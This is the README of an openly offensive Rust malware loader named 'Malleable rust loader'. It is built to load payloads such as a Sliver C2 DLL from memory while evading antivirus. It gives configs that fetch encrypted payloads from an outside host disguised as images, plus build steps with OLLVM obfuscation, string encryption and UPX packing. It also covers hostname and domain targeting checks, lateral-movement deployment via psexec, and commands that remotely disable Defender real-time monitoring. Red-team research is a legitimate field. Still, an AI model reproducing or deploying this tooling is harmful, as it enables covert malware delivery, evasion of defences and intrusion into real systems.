# Malleable rust loader

![Malleable rust loader](banner.png?raw=true "Malleable rust loader")

```
malléable : adjectif
    1.
    Qui a la propriété de s'aplatir et de s'étendre en lames, en feuilles.
    L'or est le plus malléable des métaux.
```
## Table of Contents

- [Introduction](#introduction)
- [Features](#features)
  - [Config](#config)
  - [Payloads](#payloads)
  - [Compilation](#Compilation)
  - [Link](#Link)
  - [DataOperation](#DataOperation)
- [Design](#design)
  - [Exec steps explanation](#exec-steps-explanation)
  - [Execution workflow](#Execution-workflow)
  - [Config example](#Config-example)
- [How to use it](#How-to-use-it)
  - [1. Installation](#1-Installation)
    - [First steps](#First-steps)
    - [.bashrc addition](#bashrc-addition)
    - [debug logs](#debug-logs)
    - [OLLVM compilation (optionnal)](#OLLVM-compilation-optionnal)
  - [2. Encrypt payload (optionnal)](#2-encrypt-payload-optionnal)
  - [3. Create config file](#3-Create-config-file)
  - [4. Compile loader](#4-Compile-loader)
    - [linux compilation](#linux-compilation)
    - [windows debug compilation with logs](#windows-debug-compilation-with-logs)
    - [windows release compilation](#windows-release-compilation)
    - [windows OLLVM release compilation](#windows-OLLVM-release-compilation)
  - [5. Deploy config and payload](#5-Deploy-config-and-payload)
- [Side scripts](#Side-scripts)
  - [Winrust](#Winrust)
  - [reduced size and PACK with UPX](#reduced-size-and-PACK-with-UPX)
- [Roadmap](#Roadmap)
- [Credits and Thanks](#Credits-and-Thanks)
- [Licence](#Licence)

---

## Introduction

The objectiv of the Malleable rust loader is to load various payload (DLL from memory, Exe, etc...) in a way to evade static analysis of Antivirus. It can fetch data from various methods and perform multiple data operation to deobfuscate or decrypt payloads and new configuration.

Loader behavior is define by a config file and is higly customisable. At first the loader include initial config file and just before doing anything, there is mecanisms to update the config by a new one.

Every config file are also sign with elliptics curbs to trust them, this allow to store them in a non fully trust place and allow to disseminate backup way to keep control of your running loader.

Various way to retreive data for exec payload and reload configs are regrouped in the Link object, this allow to retreive data with network protocol HTTP, DNS(todo), WebSocket(todo), from file in the system or heaven from the loader Memory  by including stuff at compile time.

In addition, there is mechanism to modify to collected data retreive from a Link, its come from a list of define DataOperation to retreive the original data. (encrypted DLL, BASE64+ROT13 config file)

Moreover, some defuse action could be define before reloading config or executing payload (internet connectivity, specific domain join, or expected hostname)

LLVM Obfuscator (OLLVM) compilation options + string encryption are also include to avoid static analysis.


# Features

### Config

- [x] Include an encrypted first config generated from a json file
- [x] Reload new config at runtime with Link
- [x] Verify config with Ed25519 elliptic-curv

### Payloads

- [x] **Banner** : Display the awesome project banner 
- [x] **DownloadAndExec** : allow you to exec something else from disk, could be used to replace the Loader by a new version
- [x] **DllFromMemory** : The Star feature, allow you to run a DLL from Memory with module memorymodule-rs wish is apure rust adaptation of fancycode/MemoryModule (https://github.com/fancycode/MemoryModule)
- [x] **ExecPython** : Allow to exec python code, in conjonction with the Pyramid project of Naksyn, this allow to run exe from memory with a commandline.


### Compilation

- [X] cross compilation from linux
- [X] Windows oriented loader but support also Linux.
- [X] OLLVM obfuscation
- [X] Winrust side script to easily cross compil and test against a Windows.


### Link

Fetch data with various methods, du to loader config structure, its easy to add a new Link type.

- [x] HTTP
- [x] FILE
- [ ] Websocket (todo, ez)
- [ ] DNS (todo, hard), the plan is to use the DNSCAT protocol
- [x] MEMORY -> this permit to create a packer

### DataOperation

The way to modify fetch data from link

- [x] BASE64
- [x] ROT13
- [x] REVERSE
- [x] WEBPAGE -> allow to put the data somewhere into HTML
- [x] AEAD

# Design

## Exec steps explanation

The loader when running:
1. Decrypt the first config file from memory
2. Verify if defuse conditions to reload config are met or stop exec
3. Reload its configuration by downloading a new one from first Link (various protocol)
4. De-obfuscate collected configuration data
5. Verify the new configuration with elliptic-curv Ed25519
6. Eventually replace the Loader configuration if it found a new valid one, or try to fetch an other valid config Link
7. Verify if exec defuse conditions are met before next steps
8. Run the defined payloads !

## Execution workflow

TODO: IMAGE

## Config example

Here, this is the first line of the config file the first update link is stored in a HTML page : **gobelin.html** and the second one in **troll.html**.
Then the payload to run is a **DllFromMemory**, (here Sliver C2). As you see, the DLL is encrypted+sign with dataoperation:AEAD.

```
{
  "loaderconf_update_links": [
    {
      "HTTP": {
        "url": "https://kaboum.xyz/artdonjon/gobelin.html",
        "dataoperation": [
          "WEBPAGE",
          "BASE64"
        ],
        "sleep": 0,
        "jitt": 0
      }
    },
    {
      "HTTP": {
        "url": "https://kaboum.xyz/artdonjon/troll.html",
        "dataoperation": [
          "WEBPAGE",
          "BASE64"
        ],
        "sleep": 0,
        "jitt": 0
      }
    }
  ],
  "payloads": [
    {
      "DllFromMemory": {
        "link": {
          "HTTP": {
            "url": "https://kaboum.xyz/artdonjon/donjon_dll.jpg",
            "dataoperation": [
              {
                "AEAD": {
                  "key_bytes": [
                    13,
                    48,
                    30,
                    236,
                    11,
                    235,

[...]
```

This is the last part of the config,
Here, before reloading any configuration, the loader try to fetch Internet (microsoft.com or microsoftonline.com). After that, he verify both hostname or domain join name before running any payload.

At the end, you can see the elliptic-curv Ed25519 material. The config is signed with a private key present in the compil host.

```
  "defuse_update": [
    {
      "CheckInternet": {
        "list": [
          "https://www.microsoft.com",
          "https://login.microsoftonline.com"
        ],
        "operator": "AND"
      }
    }
  ],
  "defuse_payload": [
    {
      "Hostname": {
        "list": [
          "DEBUG-PC",
        ],
        "operator": "OR"
      }
    },
    {
      "DomainJoin": {
        "list": [
          "sevenkingdoms.local",
          "essos.local"
        ],
        "operator": "AND"
      }
    }
  ],
  "sign_material": {
    "peer_public_key_bytes": [
      119,
      106,
      243,
      236,
      26
[...]
    ],
    "sign_bytes": [
      166,
      179,
      27,
      207,
[...]
```



# How to use it

## 1. Installation

### First steps

Here you will :
- Generate a private Ed25519 key pair, this is you sign material
- install ~/.malleable/ working directory
- install windows rust tools chain

Run this:

```
cargo run --bin initmasterkey
rustup target add x86_64-pc-windows-gnu
```

### .bashrc addition

This line should be added to you bashrc for compilation output and string encryption :
```
export RUST_LOG=info
min=200
max=300
lit=$(python -c "import random; print(random.randint($min,$max))")
export LITCRYPT_ENCRYPT_KEY=$(tr -dc A-Za-z0-9 </dev/urandom | head -c $lit; echo)
```

### debug logs

If you want to use the log/debug option, you should set global env variable for system and user in the Windows host:

```
setx RUST_LOG info /m
setx RUST_LOG info
```

After that, you can now use the params: `winrust --log, --debug` , to have a nice output.

### OLLVM compilation (optionnal)

This part is optionnal.

Thanks to this awesome project: https://github.com/joaovarelas/Obfuscator-LLVM-16.0
You should follow the instruction to install it, (its docker its ez !)


## 2. Encrypt payload (optionnal)

Here, you will generate encrypted payloads with AEAD. This is optionnal, you can use paylaod not encrypted or only test with the Banner Payload at first. Because you should know the payload decryption key and auth flag, you should create it before the config.

Example for a sliver.dll :

```
cargo run --bin encrypt_payload ~/.malleable/payload/sliver.dll
```

## 3. Create config file

Here you will generate a config file, sign it and prepare the file to become the initial config loader.

conf.rs is designed to create Working json config file and sign it automatically.
By default, the conf.rs script try to fetch key to decrypt dll here: `.malleable/payloads/sliver/sliver.dll.dataop` , modifying it for simplicity: 

```cargo run --bin conf dll```

If you modify a json config by hand, you should sign it againg.

```cargo run --bin sign /home/user/.malleable/config/initial.json```

## 4. Compile loader

Here you will compile the loader with the initial config file.

- This config initial config `~/.malleable/config/initial.json` when you sign it.
- encrypted+obfsuscated initial config is store in `~/.malleable/config/initial.json.aead` when you sign it/
- And this file contains decrypt key + all dataoperation to decrypt the initial config : `~/.malleable/config/initial.json.aead.dataop.rot13b64`

Here, find the 

### linux compilation

```cargo run --bin loader```

### windows debug compilation with logs

```cargo rustc --target x86_64-pc-windows-gnu --bin loader --features logdebug```

or with **winrust.py** (recommended)

```winrust loader --debug```

### windows release compilation

```cargo build --target x86_64-pc-windows-gnu --bin loader --release```

or with **winrust.py** (recommended)

```winrust loader --release```


### windows OLLVM release compilation


The OLLVM compilation should be reserved for release build.

This oneliner use approximately 4go of RAM (to confirm):

```sudo docker run -v $(pwd):/projects/ -e LITCRYPT_ENCRYPT_KEY="$LITCRYPT_ENCRYPT_KEY" -it ghcr.io/joaovarelas/obfuscator-llvm-16.0 cargo rustc --bin loader --features ollvm  --target x86_64-pc-windows-gnu --release -- -Cdebuginfo=0 -Cstrip=symbols -Cpanic=abort -Copt-level=3 -Cllvm-args='-enable-acdobf -enable-antihook -enable-adb -enable-bcfobf -enable-cffobf -enable-splitobf -enable-subobf -enable-fco -enable-strcry -enable-constenc'```

Depending of the compilation options you choose, you should monitor your RAM consumption because this increase too much and stop/freeze your computer when reaching the maximum you have.

Because of that, some compilation flag are not includ by default in winrust


## 5. Deploy config and payload

This part is up to you.
you should deploy config file and payload manually.
It's not part of the project today. Wait next release 2.0 for this.

For example, with the previous config you should put a first reload config here :
https://kaboum.xyz/artdonjon/gobelin.html and an encrypted DLL here : https://kaboum.xyz/artdonjon/donjon_dll.jpg



# Side scripts

This part define side script and commands to help you 

##  Winrust

`winrust.py`, is a script to that could help you to easily:
- cross-compile from linux to Windows
- deploy exe with SMB into a Windows host
- and run it with psexec.py (or other impacket lateral movement script)

Moreover, this script help you for debugging by adding output, perform OLLVM compilation and add payload memory in the laoder at compile time.

```
└─$ winrust --help
usage: winrust [-h] [--mem1] [--mem2] [--mem3] [--mem4] [-exec_target EXEC_TARGET] [-exec_method EXEC_METHOD] [--ollvm] [--release] [--log] [--verbose] bin

Tools to help from Linux to compile rust code Windows and then exec it into a Windows host by uploading with SMB + use some some impacket LateralMovement techniques

positional arguments:
  bin                   target bin

options:
  -h, --help            show this help message and exit
  --mem1                add file to memory 1
  --mem2                add file to memory 2
  --mem3                add file to memory 3
  --mem4                add file to memory 4
  -exec_target EXEC_TARGET
                        [[domain/]username[:password]@]<targetName or address>, by default use the content of ~/.exec
  -exec_method EXEC_METHOD
                        Method to execute on the Windows side, default psexec.py
  --ollvm               OLLVM obfuscation, add the release flag automatically
  --release             activate the cargo release mode for compilation, sinon its debug
  --log, --debug        activate the agent debug log into STDOUT, you should also activate rust loggin via env variable: setx RUST_LOG info /m + setx RUST_LOG info
  --verbose, -v         verbose execution

by Brother
```

-> be carefull, **psexec.py** is catch by Antivirus Defender but have the advantage of sending live output during execution wish is very important to debug.
if you want to test against an Defender, you can switch to **atexex.py**, you will have output but at the end of the execution.


## Stop Antivirus

You could stop antivirus to debug with psexec.py and reactivate it with this commandline:

```
alias avup="wmiexec.py -shell-type powershell $(cat ~/.exec) 'Set-MpPreference -DisableRealtimeMonitoring \$false'"
alias avdown="wmiexec.py -shell-type powershell $(cat ~/.exec) 'Set-MpPreference -DisableRealtimeMonitoring \$true'"
```

## reduced size and PACK with UPX

```
sudo upx -9 -v --ultra-brute  target/x86_64-pc-windows-gnu/release/loader.exe
```


# Roadmap


- infra as code to deploy or redeploy config and payload stage -> v2.0
- more payload
- more Link to fetch data : DNS + WebSocket
- More way to defeat static analysis -> tricks are welcome!
- Network redirector to modify the traffic behavior of an implant (listen 127.0.0.1 -> redirect to C2)
- collect data and send to C2 with a special payload : TODO
- find a way to sends logs into a C2, could be nice for error
- persistence payloads
- stegano for DataOperation, hide config and payload into nice harmless pictures

# Credits and Thanks

- Thanks to Victor P. for is perfect knowledge of Rust.
- Thanks to this awesome dockerisation of the OLLVM project https://github.com/joaovarelas/Obfuscator-LLVM-16.0 . https://vrls.ws/posts/2023/06/obfuscating-rust-binaries-using-llvm-obfuscator-ollvm/
- Thanks to https://github.com/fancycode/MemoryModule and [memorymodule-rs](https://lib.rs/crates/memorymodule-rs)
- Thanks to https://github.com/naksyn/Pyramid + https://github.com/naksyn/Embedder
- And thanks to the very nice Rust community helping me well !!


# Licence

 <p xmlns:cc="http://creativecommons.org/ns#" xmlns:dct="http://purl.org/dc/terms/"><a property="dct:title" rel="cc:attributionURL" href="https://github.com/Brother-x86/malleable-rust-loader">Malleable rust loader</a> by <a rel="cc:attributionURL dct:creator" property="cc:attributionName" href="https://avatars.githubusercontent.com/u/23420407?v=4">Brother-x86</a> is licensed under <a href="https://creativecommons.org/licenses/by/4.0/?ref=chooser-v1" target="_blank" rel="license noopener noreferrer" style="display:inline-block;">Creative Commons Attribution 4.0 International<img style="height:22px!important;margin-left:3px;vertical-align:text-bottom;" src="https://mirrors.creativecommons.org/presskit/icons/cc.svg?ref=chooser-v1" alt=""><img style="height:22px!important;margin-left:3px;vertical-align:text-bottom;" src="https://mirrors.creativecommons.org/presskit/icons/by.svg?ref=chooser-v1" alt=""></a></p> 